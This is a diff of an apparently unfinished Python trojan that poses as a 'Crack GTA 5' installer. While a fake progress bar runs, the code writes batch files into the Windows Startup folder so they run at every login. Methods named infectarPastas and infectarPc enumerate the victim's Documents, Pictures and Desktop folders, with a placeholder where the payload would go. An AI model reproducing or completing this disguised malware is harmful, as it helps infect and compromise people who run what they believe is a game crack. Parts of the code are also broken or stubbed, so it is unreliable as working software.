@@ -1,5 +1,6 @@
 import time
 import os
+from os import listdir
 import threading
 from tkinter import *
 from tkinter import ttk
@@ -37,20 +38,14 @@ class Principal:
                 btnProximo.place(x=380, y=250)
                 btnCancelar.place(x=250, y=250)
 
-                t = threading.Thread(target=self.infectarPc)
-                t.start()
+                self.criarBatInicializacao()
+                self.infectarPastas()
+                self.criarProcessoWindows()
 
                 self.win.mainloop()
 
 
         def criarBatInicializacao(self):
-                with open(os.path.expanduser("~") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/Driver.bat", "w") as arq:
-                        arq.write("@echo off")
-                        arq.write("\n")
-                        arq.write("start min file.bat")
-                        arq.write("\n")
-                        arq.write("exit")
-                        arq.close()
 
                 with open(os.path.expanduser("~") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/file.bat", "w") as arq:
                         arq.write("echo off")
@@ -64,54 +59,75 @@ class Principal:
                         arq.close()
 
 
+        def criarProcessoWindows(self):
+                print('')
 
-        def navegarPastas(self):
-                dir = os.path.dirname(os.path.realpath(__file__))
+        def infectarPastas(self):
 
+                user = os.path.expandvars("%userprofile%")
 
-        def infectarPc(self):
-                self.criarBatInicializacao()
-                self.navegarPastas()
+                documentos = [arq for arq in listdir(user + "/Documents")]
+                imagens = [arq for arq in listdir(user + "/Pictures")]
+                areaTrabalho = [arq for arq in listdir(user + "/Desktop")]
 
+                # Fazer algo
+                
+                print(documentos)
+                print(imagens)
+                print(areaTrabalho)
+        
 
         def btn_click(self):
-                progresso = Progresso()
-
-                progresso.main()
-
+                
                 self.win.destroy()
+
+                Progresso()
+
+                
 
 
 
 class Progresso:
 
         win = Tk()
+        var_barra = 1
 
         def __init__(self):
                 self.win.title("Crack GTA 5")
                 self.win.geometry("500x80+150+150")
                 
-                var_barra = 1
-                minha_barra = ttk.Progressbar(self.win, variable=var_barra, maximum=100)
+                minha_barra = ttk.Progressbar(self.win, length=500, variable=self.var_barra, maximum=100)
                 lbProgresso = Label(self.win, text="Aguarde até o fim da instalação")
 
                 minha_barra.place(x=0, y=40)
                 lbProgresso.place(x=10, y=0)        
 
-                tPb = threading.Thread(target=self.progressbar)
+                tPb = threading.Thread(target=self.infectarPc)
                 tPb.start()
 
+                if tPb:
+                        self.progressbar()
+                        
+
                 self.win.mainloop()
+
 
         def progressbar(self):
                 
                 for x in range(0, 101):
-                        var_barra = x
+                        self.var_barra = x
 
-                        print(var_barra)
+                        print(self.var_barra)
 
                         self.win.update()
                         time.sleep(.500)
 
+
+        def navegarPastas(self):
+                dir = os.path.dirname(os.path.realpath(__file__))
+
+
+        def infectarPc(self):
+                self.navegarPastas()
 
 principal = Principal()
